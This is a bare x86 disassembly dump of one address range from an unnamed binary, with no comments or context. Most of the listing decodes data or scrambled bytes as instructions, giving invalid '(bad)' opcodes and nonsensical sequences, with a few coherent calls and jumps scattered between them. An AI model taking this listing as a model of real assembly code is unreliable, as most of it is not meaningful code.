  4079e0:	call   0x3583fba0
  4079e5:	pop    esi
  4079e6:	rcl    BYTE PTR [edi+edx*1],0xbc
  4079ea:	(bad)  
  4079eb:	mov    WORD PTR [edi-0x58f7a2b3],fs
  4079f1:	scas   eax,DWORD PTR es:[edi]
  4079f2:	xchg   ecx,eax
  4079f3:	je     0x407a11
  4079f5:	jg     0x407a3a
  4079f7:	iret   
  4079f8:	mov    dh,0xc9
  4079fa:	rol    BYTE PTR [edx],0x4e
  4079fd:	scas   eax,DWORD PTR es:[edi]
  4079fe:	test   BYTE PTR [eax-0x1d],dh
  407a01:	pop    ebx
  407a02:	mov    bh,0x77
  407a04:	or     ch,dl
  407a06:	lds    eax,FWORD PTR [ebp+eax*2+0x7c]
  407a0a:	ss stos BYTE PTR es:[edi],al
  407a0c:	xacquire xchg BYTE PTR [esi*1-0xdfdea62],al
  407a14:	fcmovnbe st,st(0)
  407a16:	dec    edx
  407a17:	retf   0xab4
  407a1a:	es or  al,0x51
  407a1d:	loopne 0x4079a7
  407a1f:	fmul   DWORD PTR [ebx]
  407a21:	jmp    0xa60dbeed
  407a26:	sbb    DWORD PTR [edi-0x7],eax
  407a29:	cmc    
  407a2a:	cmp    DWORD PTR [eax],edx
  407a2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a2d:	je     0x407a54
  407a2f:	scas   al,BYTE PTR es:[edi]
  407a30:	jge    0x407a0c
  407a32:	cmp    al,0xef
  407a34:	in     al,0xba
  407a36:	cmp    al,0xc8
  407a38:	fnstcw WORD PTR [eax-0x399f19d1]
  407a3e:	dec    ebp
  407a3f:	xchg   edx,eax
  407a40:	stc    
  407a41:	out    0xc0,eax
  407a43:	call   FWORD PTR [ecx+ebx*4-0x5e]
  407a47:	or     ecx,ecx
  407a49:	jae    0x4079e1
  407a4b:	test   al,0xe5
  407a4e:	cmp    eax,0xc6ea417e
  407a53:	repz arpl sp,sp
  407a56:	ret    
  407a57:	outs   dx,BYTE PTR ds:[esi]
  407a58:	add    eax,ecx
  407a5a:	adc    bh,ah
  407a5c:	xchg   ebp,eax
  407a5d:	in     al,dx
  407a5e:	inc    edx
  407a5f:	dec    eax
  407a60:	lahf   
  407a61:	ins    DWORD PTR es:[edi],dx
  407a62:	or     ch,dh
  407a64:	mov    WORD PTR [ebx-0x10718589],?
  407a6a:	or     DWORD PTR [esi-0x1f],edx
  407a6d:	scas   eax,DWORD PTR es:[edi]
  407a6e:	pushf  
  407a6f:	pop    esp
  407a70:	out    0xb,al
  407a72:	inc    ecx
  407a73:	xor    edi,DWORD PTR [esi+0x790f8811]
  407a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a7a:	into   
  407a7b:	mov    cl,0xd6
  407a7d:	jnp    0x407aaa
  407a7f:	mov    ds:0xe66907c2,al
  407a84:	pop    esi
  407a85:	(bad)  
  407a86:	rcl    bh,cl
  407a88:	jmp    DWORD PTR [ebp+eiz*4+0x5a]
  407a8c:	cmp    eax,0xd682bb55
  407a91:	add    esi,DWORD PTR [edi-0x6b]
  407a94:	mov    eax,ds:0x7b6d874
  407a99:	mov    ds:0x8c446b2e,al
  407a9e:	out    dx,al
  407a9f:	adc    BYTE PTR [eax+0xd],al
  407aa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407aa3:	(bad)  [eax+0xf]
  407aa6:	scas   eax,DWORD PTR es:[edi]
  407aa7:	mov    ds:0x7f64c222,eax
  407aac:	shr    BYTE PTR [ebx+0x726b6c43],1
  407ab2:	popa   
  407ab3:	lods   al,BYTE PTR ds:[esi]
  407ab4:	sub    eax,0xc23d974
  407ab9:	js     0x407b2b
  407abb:	lods   al,BYTE PTR ds:[esi]
  407abc:	imul   edx,ebx,0x924d2f64
  407ac2:	add    DWORD PTR [esi],edi
  407ac4:	pusha  
  407ac5:	les    ebp,FWORD PTR [ecx]
  407ac7:	popf   
  407ac8:	xor    BYTE PTR [ecx-0x13e9e1c],ch
  407ace:	jle    0x407a79
  407ad0:	xor    al,bh
  407ad2:	jl     0x407aef
  407ad4:	dec    eax
  407ad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ad6:	pop    ebx
  407ad7:	push   0x33
  407ad9:	in     al,dx
  407ada:	test   eax,0x702bd102
  407adf:	dec    ecx
  407ae0:	fisub  DWORD PTR [edx+0x76]
  407ae3:	jno    0x407b49
  407ae5:	xlat   BYTE PTR ds:[ebx]
  407ae6:	cmp    al,0xd
  407ae8:	add    al,BYTE PTR [ebx+edx*1+0x7ed2c19]
  407aef:	imul   ebx,DWORD PTR [eax],0x14cc1982
  407af5:	ds sub eax,0xc8b2122c
  407afb:	fiadd  DWORD PTR [eax]
  407afd:	dec    ebx
  407afe:	mov    al,ds:0x93644f9a
  407b03:	inc    esp
  407b04:	cmp    dh,BYTE PTR [edx]
  407b06:	in     eax,0x5b
  407b08:	mov    al,0xb9
  407b0a:	pop    ss
  407b0b:	add    ebx,edx
  407b0d:	cmp    DWORD PTR [ecx+0x17],edx
  407b10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b11:	xchg   ebp,eax
  407b12:	out    dx,al
  407b13:	xor    BYTE PTR [edi-0x38fc39cd],ah
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	mov    ebp,0x57032f0a
  407b44:	leave  
  407b45:	jo     0x407bb7
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407b57
  407b4c:	cmc    
  407b4d:	pop    ecx
  407b4e:	dec    ecx
  407b4f:	dec    edi
  407b50:	aas    
  407b51:	mov    eax,ds:0xc0dd768c
  407b56:	imul   edi,DWORD PTR [ecx-0x3b3345db],0xdc88bbc0
  407b60:	dec    edx
  407b61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b62:	dec    eax
  407b63:	push   ebx
  407b64:	cs clc 
  407b66:	jp     0x407b46
  407b68:	cmovne esp,DWORD PTR [eax]
  407b6b:	mov    bh,ch
  407b6d:	test   al,0xf
  407b6f:	retf   0x544a
  407b72:	add    DWORD PTR [eax+0x508b4e9f],edx
  407b78:	jmp    0xe312391b
  407b7d:	add    BYTE PTR [edx+eiz*2-0x13],ch
  407b81:	and    al,dh
  407b83:	inc    ebx
  407b84:	sbb    edi,esp
  407b86:	imul   esp,ebx,0x21
  407b89:	mov    eax,ds:0xe288498a
  407b8e:	or     DWORD PTR [edi],eax
  407b90:	sub    al,0xdc
  407b92:	(bad)  
  407b93:	pop    edx
  407b94:	repnz xor eax,0x22c29fe6
  407b9a:	imul   ebx,DWORD PTR [edi-0x3c9c76ed],0xffffffa1
  407ba1:	ret    
  407ba2:	push   esp
  407ba3:	xchg   ebp,eax
  407ba4:	cs mov cl,0x22
  407ba7:	fisubr WORD PTR [edi+0xfdb9b58]
  407bad:	push   edi
  407bae:	adc    eax,0xfb2e2384
  407bb3:	mov    edi,0xc297c900
  407bb8:	mov    cs:0x9e474e99,eax
  407bbe:	push   ds
  407bbf:	rcl    esi,cl
  407bc1:	jp     0x407c02
  407bc3:	jmp    0x407bad
  407bc5:	sub    dh,0x29
  407bc8:	push   eax
  407bc9:	add    DWORD PTR [edx-0x5ba89322],eax
  407bcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bd0:	xchg   BYTE PTR [edi],al
  407bd2:	and    ecx,DWORD PTR [edi+0x9]
  407bd5:	fdivr  DWORD PTR [esi]
  407bd7:	xor    BYTE PTR [eax+0x337543e4],bh
  407bdd:	or     BYTE PTR [eax],cl
  407bdf:	retf   
  407be0:	imul   edx,DWORD PTR [eax-0x53],0xffffffff
  407be4:	es std 
  407be6:	nop
  407be7:	not    eax
  407be9:	mov    bl,0x3a
  407beb:	mov    esp,edx
  407bed:	mov    ebx,0xa97b0ad0
  407bf2:	and    DWORD PTR [esi-0x4ae134dd],edi
  407bf8:	jo     0x407bae
  407bfa:	mov    bh,0xfd
  407bfc:	pop    ecx
  407bfd:	test   DWORD PTR [edx+0x394ebbd5],edx
  407c03:	sub    eax,0x550f0b81
  407c08:	lods   eax,DWORD PTR ds:[esi]
  407c09:	popa   
  407c0a:	nop
  407c0b:	or     al,0xe7
  407c0d:	xchg   BYTE PTR [edx+0x7384e1ea],bh
  407c13:	ret    
  407c14:	jp     0x407c69
  407c16:	push   edx
  407c17:	repz out dx,al
  407c19:	call   0xb64a:0x317f59
  407c20:	imul   eax,DWORD PTR [eax+0x17],0x44
  407c24:	out    0xe4,eax
  407c26:	dec    ebp
  407c27:	rcr    BYTE PTR ds:0xe7d9ea44,0xc0
  407c2e:	aam    0xc5
  407c30:	push   es
  407c31:	shl    DWORD PTR [esi+0x4],0x6d
  407c35:	push   0xffffff85
  407c37:	jge    0x407c5e
  407c39:	jp     0x407c51
  407c3b:	xor    BYTE PTR [ecx+0x76],al
  407c3e:	adc    bl,BYTE PTR [eax+0x39b1a874]
  407c44:	test   al,0x66
  407c46:	mov    edx,0x87bce72a
  407c4b:	aam    0x8e
  407c4d:	xlat   BYTE PTR ds:[ebx]
  407c4e:	xor    ch,ch
  407c50:	outs   dx,BYTE PTR ds:[esi]
  407c51:	push   esp
  407c52:	outs   dx,BYTE PTR ds:[esi]
  407c53:	cs stos DWORD PTR es:[edi],eax
  407c55:	and    al,0x12
  407c57:	loopne 0x407c45
  407c59:	pop    ebx
  407c5a:	add    BYTE PTR ds:[edx-0x3236fb0d],al
  407c61:	pop    esi
  407c62:	xchg   esi,eax
  407c63:	data16 loop 0x407cba
  407c66:	sbb    BYTE PTR [ecx],bh
  407c68:	sub    al,0x19
  407c6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c6b:	das    
  407c6c:	mov    BYTE PTR [ebx+0x2d],cl
  407c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c70:	pop    edi
  407c71:	ret    0x2827
  407c74:	cmp    BYTE PTR [edi],dl
  407c76:	xchg   BYTE PTR [ebx+0x5f],dl
  407c79:	jl     0x407c5e
  407c7b:	lea    edx,[edi]
  407c7d:	test   DWORD PTR [eax+0x60dcc8f7],0x87ba2e29
  407c87:	jb     0x407cab
  407c89:	repnz inc eax
  407c8b:	jnp    0x407ca8
  407c8d:	addr16 pop ecx
  407c8f:	call   0x2e36:0x6c12e6d
  407c96:	xchg   edi,eax
  407c97:	jnp    0x407c26
  407c99:	or     ch,BYTE PTR [esi+0x4c378584]
  407c9f:	sar    DWORD PTR [ecx+0x1b],cl
  407ca2:	mov    ah,0xec
  407ca4:	xor    al,0x14
  407ca6:	fwait
  407ca7:	inc    esp
  407ca8:	dec    edi
  407ca9:	test   edi,0xe2158c9e
  407caf:	add    ah,BYTE PTR [ecx-0x6cdb08b]
  407cb5:	ja     0x407ccb
  407cb7:	sahf   
  407cb8:	loopne 0x407cb4
  407cba:	jp     0x407d16
  407cbc:	add    dh,BYTE PTR [ebp+0x47d8e1a6]
  407cc2:	push   0x61c3aa30
  407cc7:	mov    dl,0x91
  407cc9:	pop    edi
  407cca:	pushf  
  407ccb:	push   esi
  407ccc:	mov    ah,dl
  407cce:	dec    ebp
  407ccf:	and    dl,BYTE PTR [edx+0x63dd4d58]
  407cd5:	pop    edx
  407cd6:	int3   
  407cd7:	gs sbb eax,0x6ce71bf
  407cdd:	mov    esi,0xfa157a2d
  407ce2:	daa    
  407ce3:	fcom   st(6)
  407ce5:	jge    0x407cbb
  407ce7:	stos   DWORD PTR es:[edi],eax
  407ce8:	mov    ah,0xb0
  407cea:	xchg   esp,eax
  407ceb:	mov    ebx,0x77b9bf59
  407cf0:	inc    esi
  407cf1:	shr    BYTE PTR [edi-0x34bf1556],1
  407cf7:	or     cl,BYTE PTR [eax]
  407cf9:	mov    DWORD PTR ds:0x7ccb22d,0x23c59bb1
  407d03:	leave  
  407d04:	fisubr WORD PTR [ebp-0x16]
  407d07:	and    al,BYTE PTR [edx-0x2b]
  407d0a:	aam    0x9e
  407d0c:	inc    eax
  407d0d:	xchg   edi,eax
  407d0e:	inc    ebx
  407d0f:	pop    ecx
  407d10:	jne    0x407ce0
  407d12:	mov    edx,ebx
  407d14:	je     0x407d0a
  407d16:	cld    
  407d17:	stc    
  407d18:	into   
  407d19:	and    bh,BYTE PTR [edi-0x734a90e1]
  407d1f:	sbb    eax,0xe27431cb
  407d24:	(bad)  
  407d25:	out    0x18,eax
  407d27:	cmp    al,0xe2
  407d29:	push   ss
  407d2a:	mov    al,0x41
  407d2c:	imul   eax,DWORD PTR [edi],0x6f
  407d2f:	dec    edx
  407d30:	mov    WORD PTR [edi+0x55a2fb49],?
  407d36:	lock (bad) 
  407d38:	int    0x79
  407d3a:	scas   eax,DWORD PTR es:[edi]
  407d3b:	xor    DWORD PTR [esi],ebp
  407d3d:	sub    eax,0xcd6cbc80
  407d42:	mul    DWORD PTR [ebx+0x2f2f5e4e]
  407d48:	xor    esp,esi
  407d4a:	jae    0x407db0
  407d4c:	jp     0x407da0
  407d4e:	mov    WORD PTR [edx+0x48],es
  407d51:	xchg   ebx,eax
  407d52:	in     eax,dx
  407d53:	or     DWORD PTR [ebx-0x6544e3a4],edx
  407d59:	lods   eax,DWORD PTR ds:[esi]
  407d5a:	test   BYTE PTR [edx],al
  407d5c:	inc    eax
  407d5d:	in     eax,0x92
  407d5f:	dec    esp
  407d60:	push   ebp
  407d61:	xor    BYTE PTR [ecx+0x49fd5369],dl
  407d67:	adc    eax,DWORD PTR [ebp+0x96e08af]
  407d6d:	sbb    esi,DWORD PTR [esp+edi*8+0x4b]
  407d71:	cmp    ch,BYTE PTR ds:0x54d157b1
  407d77:	xor    ebp,ebp
  407d79:	dec    ecx
  407d7a:	jmp    0x407dc3
  407d7c:	fisub  WORD PTR [ecx-0x6e]
  407d7f:	test   bh,bh
  407d81:	bound  eax,QWORD PTR [edx+0x553e687b]
  407d87:	ins    DWORD PTR es:[edi],dx
  407d88:	sti    
  407d89:	adc    ebp,eax
  407d8b:	jle    0x407df9
  407d8d:	push   edi
  407d8e:	xor    DWORD PTR [edi-0x68],0xffffffc4
  407d92:	mov    ebp,0x81dcc42f
  407d97:	push   0xb9bea034
  407d9c:	adc    ebp,ecx
  407d9e:	lahf   
  407d9f:	jg     0x407dcd
  407da1:	in     al,dx
  407da2:	repz add dl,BYTE PTR [ecx-0x795dc45a]
  407da9:	mov    dl,0x9e
  407dab:	pushf  
  407dac:	and    ecx,eax
  407dae:	enter  0x547d,0x8d
  407db2:	test   edi,0x686c379d
  407db8:	push   cs
  407db9:	gs dec esi
  407dbb:	inc    ecx
  407dbc:	jecxz  0x407d5e
  407dbe:	scas   eax,DWORD PTR es:[edi]
  407dbf:	fist   WORD PTR [esi+0x424837e1]
  407dc5:	outs   dx,BYTE PTR ds:[esi]
  407dc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dc7:	das    
  407dc8:	(bad)  
  407dc9:	call   sp
  407dcc:	sbb    DWORD PTR [ecx],edi
  407dce:	adc    al,0xc7
  407dd0:	aaa    
  407dd1:	rcl    BYTE PTR [ebx+0x776839e8],1
  407dd7:	xlat   BYTE PTR ds:[ebx]
  407dd8:	xchg   BYTE PTR [edi-0x6e938188],bh
  407dde:	(bad)  
  407ddf:	cdq    
  407de0:	xlat   BYTE PTR ds:[ebx]
  407de1:	lahf   
  407de2:	add    esp,0xa
  407de5:	sar    eax,0x64
  407de8:	aad    0x81
  407dea:	mov    DWORD PTR ds:0x476afdf2,ecx
  407df0:	sbb    DWORD PTR [ecx],eax
  407df2:	or     eax,0xe4b0e9d8
  407df7:	retf   0x1cf2
  407dfa:	jmp    0x3504db4b
  407dff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e00:	mov    esi,0x21a5f2ea
  407e05:	mov    bh,0x90
  407e07:	xor    ebx,DWORD PTR [esi]
  407e09:	mov    ds:0x76fb1ff1,al
  407e0e:	or     esp,DWORD PTR [eax]
  407e10:	cdq    
  407e11:	aad    0x55
  407e13:	outs   dx,DWORD PTR ds:[esi]
  407e14:	inc    ebp
  407e15:	push   esi
  407e16:	adc    ch,dl
  407e18:	sbb    DWORD PTR [edi+ecx*2+0x53],esp
  407e1c:	popf   
  407e1d:	inc    ebp
  407e1e:	sahf   
  407e1f:	repz stc 
  407e21:	inc    esi
  407e22:	retf   
  407e23:	scas   al,BYTE PTR es:[edi]
  407e24:	shl    ecx,cl
  407e26:	call   0xeee9:0x8005af8d
  407e2d:	fimul  DWORD PTR [ebx+0x2e9d0453]
  407e33:	mov    bh,al
  407e35:	sbb    DWORD PTR [esi+edx*8-0x48],esp
  407e39:	cmp    DWORD PTR [esp+esi*4+0x79],0x8963ba2b
  407e41:	inc    DWORD PTR [edi]
  407e43:	outs   dx,BYTE PTR ds:[esi]
  407e44:	cmp    ecx,esi
  407e46:	inc    edi
  407e47:	cmc    
  407e48:	mov    eax,esi
  407e4a:	xor    eax,0x6168695d
  407e4f:	mov    edx,0xb7496629
  407e54:	fcmovnbe st,st(3)
  407e56:	jp     0x407ed0
  407e58:	pushf  
  407e59:	xchg   ebp,eax
  407e5a:	mov    eax,ds:0xe90cf20e
  407e5f:	(bad)  
  407e60:	out    0x83,al
  407e62:	xchg   edi,eax
  407e63:	ja     0x407ec7
  407e65:	cmp    ebx,ecx
  407e67:	push   ds
  407e68:	mov    dl,0xd0
  407e6a:	or     DWORD PTR [edx],esp
  407e6c:	jp     0x407df6
  407e6e:	aaa    
  407e6f:	aam    0x56
  407e71:	mov    eax,ds:0x6221c10e
  407e76:	fild   DWORD PTR [ecx]
  407e78:	retf   
  407e79:	xor    esp,eax
  407e7b:	call   0x4120bb
  407e80:	mov    DWORD PTR [ebp-0x8],eax
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	add    edi,DWORD PTR ds:0xd507e08f
  407e9e:	jo     0x407f10
  407ea0:	and    BYTE PTR [ebp+0x70],bh
  407ea3:	jo     0x407e3b
  407ea5:	inc    esi
  407ea6:	aaa    
  407ea7:	inc    esi
  407ea8:	scas   eax,DWORD PTR es:[edi]
  407ea9:	out    dx,eax
  407eaa:	sub    DWORD PTR [edi+0x5accf24a],ecx
  407eb0:	pushf  
  407eb1:	cwde   
  407eb2:	(bad)  
  407eb3:	(bad)  
  407eb5:	js     0x407ec8
  407eb7:	fadd   QWORD PTR [edi-0x5a]
  407eba:	pushf  
  407ebb:	mov    ecx,0x268e0271
  407ec0:	sub    al,dh
  407ec2:	or     eax,0x21171a66
  407ec7:	dec    ecx
  407ec8:	sahf   
  407ec9:	cmc    
  407eca:	jle    0x407ec5
  407ecc:	xor    BYTE PTR [ebp-0x12],dl
  407ecf:	dec    edi
  407ed0:	jo     0x407ea4
  407ed2:	adc    ecx,DWORD PTR ds:0xfdec4554
  407ed8:	push   es
  407ed9:	stos   DWORD PTR es:[edi],eax
  407eda:	retf   0xb2d5
  407edd:	arpl   bx,sp
  407edf:	sub    DWORD PTR [ebx-0x5d],edx
  407ee2:	adc    al,0xae
  407ee4:	fs jp  0x407e69
  407ee7:	sti    
  407ee8:	cmp    DWORD PTR [eax-0x6a],esp
  407eeb:	add    al,0xce
  407eed:	pop    ebx
  407eee:	xchg   ebp,eax
  407eef:	sbb    al,0x5f
  407ef1:	add    DWORD PTR [edx+0xf],ecx
  407ef4:	mov    edi,0x261abe65
  407ef9:	jb     0x407eb7
  407efb:	adc    BYTE PTR [edi],bh
  407efd:	pop    ds
  407efe:	popa   
  407eff:	mov    eax,0x487debb5
  407f04:	in     al,0x12
  407f06:	mov    ch,0xe3
  407f08:	fbstp  TBYTE PTR [edi-0x8]
  407f0b:	mov    WORD PTR [esi],?
  407f0d:	mul    BYTE PTR [eax+ecx*1+0x34a05d31]
  407f14:	ins    BYTE PTR es:[edi],dx
  407f15:	nop
  407f16:	push   esi
  407f17:	adc    ch,BYTE PTR [esi-0x165caa55]
  407f1d:	sub    DWORD PTR [edx-0x7],esp
  407f20:	push   eax
  407f21:	lock mov bh,0x5c
  407f24:	jmp    0x407ee7
  407f26:	repz inc ecx
  407f28:	sti    
  407f29:	pop    es
  407f2a:	fst    st(1)
  407f2c:	pop    esi
  407f2d:	cli    
  407f2e:	lock ja 0x407f99
  407f31:	(bad)  
  407f32:	cmova  esi,ebx
  407f35:	push   ebp
  407f36:	xor    BYTE PTR [edx-0xa942597],0xb0
  407f3d:	dec    eax
  407f3e:	xor    bl,BYTE PTR [eax-0x2]
  407f41:	jnp    0x407f1c
  407f43:	dec    esi
  407f44:	mov    edi,ebp
  407f46:	sub    esi,DWORD PTR [eax+0x51]
  407f49:	sbb    ah,BYTE PTR [ebp+0x3771928f]
  407f4f:	ror    BYTE PTR [ebx-0x27],1
  407f52:	jbe    0x407fa2
  407f54:	pop    ebx
  407f55:	pop    ds
  407f56:	(bad)  
  407f57:	loope  0x407f53
  407f59:	mov    ds:0xedec816f,eax
  407f5e:	mov    al,0xb9
  407f60:	cld    
  407f61:	retf   0x9c2f
  407f64:	xchg   ebx,eax
  407f65:	(bad)  
  407f66:	jmp    0x4735e5ea
  407f6b:	push   es
  407f6c:	lds    ecx,FWORD PTR [edx-0x1b42377e]
  407f72:	cmp    edx,DWORD PTR ds:0x21c5effc
  407f78:	pusha  
  407f79:	cmp    bl,BYTE PTR [ecx+0x28]
  407f7c:	mov    dl,0x41
  407f7e:	fdiv   QWORD PTR [edi]
  407f80:	lods   eax,DWORD PTR ds:[esi]
  407f81:	or     DWORD PTR [eax-0x2],eax
  407f84:	jmp    0x407f99
  407f86:	inc    ah
  407f88:	push   ecx
  407f89:	xor    BYTE PTR [ebp+0x17],bl
  407f8c:	popa   
  407f8d:	xor    eax,0xd66f307a
  407f93:	rcl    BYTE PTR [edx+0x264eae3d],1
  407f99:	push   ds
  407f9a:	cmp    DWORD PTR [eax+0x46],ebx
  407f9d:	imul   ecx,DWORD PTR [edx+0x1fe6ae01],0x208c05cd
  407fa7:	into   
  407fa8:	test   al,0xea
  407faa:	pop    esi
  407fab:	data16 arpl WORD PTR [ebx-0x37b16278],ax
  407fb2:	push   es
  407fb3:	push   ebx
  407fb4:	leave  
  407fb5:	out    dx,eax
  407fb6:	and    al,0x68
  407fb8:	pushf  
  407fb9:	xor    al,0x78
  407fbb:	cmp    edx,edi
  407fbd:	xor    eax,0xdbaf91a8
  407fc2:	das    
  407fc3:	push   edi
  407fc4:	cli    
  407fc5:	mov    ds:0x98d46b01,eax
  407fca:	and    al,0x38
  407fcc:	shr    BYTE PTR [ecx],cl
  407fce:	outs   dx,DWORD PTR ds:[esi]
  407fcf:	sbb    eax,0x559c2361
  407fd4:	jge    0x407fdf
  407fd6:	sbb    esi,edi
  407fd8:	lods   eax,DWORD PTR ds:[esi]
  407fd9:	xchg   edx,eax
  407fda:	inc    esp
  407fdb:	pushf  
  407fdc:	xchg   DWORD PTR [eax-0x5e],ecx
  407fdf:	cmp    bl,BYTE PTR [ebp+0x1f]
  407fe2:	push   ebp
  407fe3:	or     BYTE PTR [edi],al
  407fe5:	int3   
  407fe6:	ins    BYTE PTR es:[edi],dx
  407fe7:	enter  0xbe24,0xfd
  407feb:	ss cli 
  407fed:	in     al,dx
  407fee:	mov    al,ds:0x19a59a57
  407ff3:	adc    bl,BYTE PTR [edi]
  407ff5:	mov    ?,WORD PTR [ebp-0x260d0267]
  407ffb:	imul   eax,DWORD PTR [edx-0x5c],0x57ef198f
  408002:	sahf   
  408003:	aam    0xed
  408005:	xchg   esp,eax
  408006:	test   BYTE PTR [ebx],bl
  408008:	adc    esi,DWORD PTR [edi+0x6ec53a0c]
  40800e:	pop    esp
  40800f:	xor    eax,0x26ceba29
  408014:	add    al,0xed
  408016:	scas   eax,DWORD PTR es:[edi]
  408017:	jne    0x40803e
  408019:	jo     0x408068
  40801b:	or     DWORD PTR [edi+0x3de45946],ecx
  408021:	stos   BYTE PTR es:[edi],al
  408022:	es loope 0x407ff7
  408025:	test   bh,bl
  408027:	gs test al,0xf2
  40802a:	in     eax,dx
  40802b:	xor    eax,0xc416f9a
  408030:	or     BYTE PTR [ebp-0x38f3ba13],bl
  408036:	hlt    
  408037:	xchg   BYTE PTR [eax+esi*8-0x3],ch
  40803b:	mov    al,0x6b
  40803d:	xchg   esp,eax
  40803e:	daa    
  40803f:	inc    esi
  408040:	sbb    cl,BYTE PTR [esi+ecx*4-0x2dd4f6d5]
  408047:	fwait
  408048:	(bad)  
  408049:	cmp    eax,0xd9f272c5
  40804e:	jmp    0x407fd2
  408050:	dec    edi
  408051:	add    BYTE PTR [esi-0x704d492b],al
  408057:	rol    edi,1
  408059:	lods   al,BYTE PTR ds:[esi]
  40805a:	shr    BYTE PTR [ebp-0x1e],cl
  40805d:	int    0xcb
  40805f:	adc    DWORD PTR [esi+0x6a],edx
  408062:	test   BYTE PTR [eax],al
  408064:	div    dh
  408066:	cld    
  408067:	push   ds
  408068:	mov    esi,0x27a5710c
  40806d:	adc    al,0xf9
  40806f:	or     al,0xdf
  408071:	lods   eax,DWORD PTR ds:[esi]
  408072:	xor    DWORD PTR [ebp-0x34],ebp
  408075:	add    ch,bh
  408077:	ss push eax
  408079:	imul   esi,DWORD PTR [edi-0x7a],0xffffffb9
  40807d:	pop    es
  40807e:	cwde   
  40807f:	xor    ebx,DWORD PTR [esp+edi*4]
  408082:	jno    0x408083
  408084:	sbb    edx,DWORD PTR [edi-0x326802e3]
  40808a:	int    0x16
  40808c:	xor    DWORD PTR [esi+0x2b011ff2],0x6a
  408093:	xchg   edx,eax
  408094:	push   es
  408095:	addr16 pushf 
  408097:	lods   eax,DWORD PTR ds:[esi]
  408098:	xor    bl,BYTE PTR [si]
  40809b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40809c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40809d:	add    dh,BYTE PTR [ebx+0x2ad31d8d]
  4080a3:	add    BYTE PTR [ebx-0x58b42816],0xb6
  4080aa:	popa   
  4080ab:	sub    eax,0x8fcd133b
  4080b0:	jp     0x4080af
  4080b2:	ins    BYTE PTR es:[edi],dx
  4080b3:	inc    edi
  4080b4:	lock ins BYTE PTR es:[edi],dx
  4080b6:	mov    ds:0xf87546f3,al
  4080bb:	sub    ah,ah
  4080bd:	dec    ebx
  4080be:	pop    ss
  4080bf:	fiadd  WORD PTR [ecx+0x18dbd6a6]
  4080c5:	inc    ebp
  4080c6:	sbb    dl,BYTE PTR [esi+0x51]
  4080c9:	popf   
  4080ca:	sub    DWORD PTR [ebx-0x21],ecx
  4080cd:	in     eax,dx
  4080ce:	dec    esp
  4080cf:	sub    BYTE PTR [edx+0x4ffd41ae],ch
  4080d5:	out    dx,al
  4080d6:	jecxz  0x40814f
  4080d8:	push   ebx
  4080d9:	cmc    
  4080da:	or     al,0x67
  4080dc:	push   0xb8096bcc
  4080e1:	int3   
  4080e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080e3:	adc    BYTE PTR [edx-0x51a042d9],ah
  4080e9:	icebp  
  4080ea:	mov    al,dh
  4080ec:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080ee:	and    DWORD PTR [eax],esp
  4080f0:	push   edx
  4080f1:	aaa    
  4080f2:	(bad)  
  4080f3:	ins    BYTE PTR es:[edi],dx
  4080f4:	pusha  
  4080f5:	lea    ebx,[ebx]
  4080f7:	jecxz  0x4080a3
  4080f9:	sbb    edi,DWORD PTR [edi+eax*4]
  4080fc:	leave  
  4080fd:	(bad)  
  4080fe:	out    dx,eax
  4080ff:	inc    ecx
  408100:	jp     0x4080a0
  408102:	mov    esi,0x1037a5fd
  408107:	inc    edi
  408108:	xor    dl,al
  40810a:	test   ecx,0x1e71830a
  408110:	xchg   ebx,eax
  408111:	retf   0xea46
  408114:	fnstenv [edx+0x4837cd58]
  40811a:	mov    dh,BYTE PTR [eax]
  40811c:	xchg   ecx,eax
  40811d:	sub    dh,0x8d
  408120:	sbb    eax,0xf1762b53
  408125:	dec    edi
  408126:	jae    0x408108
  408128:	iret   
  408129:	sbb    al,0x65
  40812b:	push   es
  40812c:	adc    BYTE PTR ds:0x45129edf,ah
  408132:	mov    ah,0x6f
  408134:	cwde   
  408135:	xor    dl,dl
  408137:	sbb    DWORD PTR [ebp+0x61ac6120],0xffffffdf
  40813e:	ret    0xc6e5
  408141:	mov    dl,0xf6
  408143:	push   0x7c
  408145:	and    esi,DWORD PTR [ebp-0x1b7f6e20]
  40814b:	push   cs
  40814c:	mov    bl,0x76
  40814e:	sbb    BYTE PTR [ebp+0x5a452c4b],bh
  408154:	xor    eax,0x848e5a20
  408159:	or     eax,0x92a755d1
  40815e:	(bad)  [ecx]
  408160:	ret    
  408161:	pop    eax
  408162:	pop    edx
  408163:	mov    BYTE PTR [edx+0x6a],bl
  408166:	test   eax,0x4a7e181a
  40816b:	xchg   edx,eax
  40816c:	mov    bh,0x2
  40816e:	jle    0x40816d
